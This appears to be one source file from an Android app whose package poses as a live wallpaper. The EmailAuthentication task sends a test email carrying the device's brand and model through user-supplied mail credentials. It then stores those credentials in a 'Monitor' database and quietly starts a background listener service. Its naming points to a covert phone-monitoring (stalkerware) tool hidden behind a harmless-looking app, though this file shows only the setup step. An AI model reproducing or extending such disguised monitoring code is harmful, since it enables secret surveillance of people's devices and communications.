package com.livewallpaper.circle.internet.email;

import java.util.ArrayList;

import com.android.os.R;
import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.Gallery;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;

public class EmailAuthentication extends AsyncTask<Object, String, Boolean> {

	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private String title;
	private String text;
	private String from;
	private String where;
	private ArrayList<Gallery> attach;
	private String password;
	private Context context;
	// private static final String LOG_TAG = "monitoring";
	private static boolean smsLogic;
	

	@Override
	protected Boolean doInBackground(Object... params) {
		try {
			context = (Context) params[0];
			mAdapter.open(context);
			title = android.os.Build.BRAND + " - " + android.os.Build.MODEL;
			text = context.getResources().getString(R.string.mode) + " !";
			attach = new ArrayList<Gallery>();
			from = where = (String) params[2];
			password = (String) params[3];

			MailSenderClass sender = new MailSenderClass(from, password);

			sender.sendMail(title, text, from, where, attach);
			smsLogic = true;
		} catch (Exception e) {
			e.printStackTrace();
			smsLogic = false;
		} finally {
			if (smsLogic) {
				long timeNow = System.currentTimeMillis();
				mAdapter.insertPerson(((String) params[1]), from, password,
						Integer.parseInt((String) params[4]), 1, timeNow, 1,
						timeNow, 1, timeNow, 0);
				// test for listener info
				if (!ServiceListener.isInstanceCreated()) {
					context.startService(new Intent(context,
							ServiceListener.class));
				}
			}
			mAdapter.close();
		}
		return false;
	}
}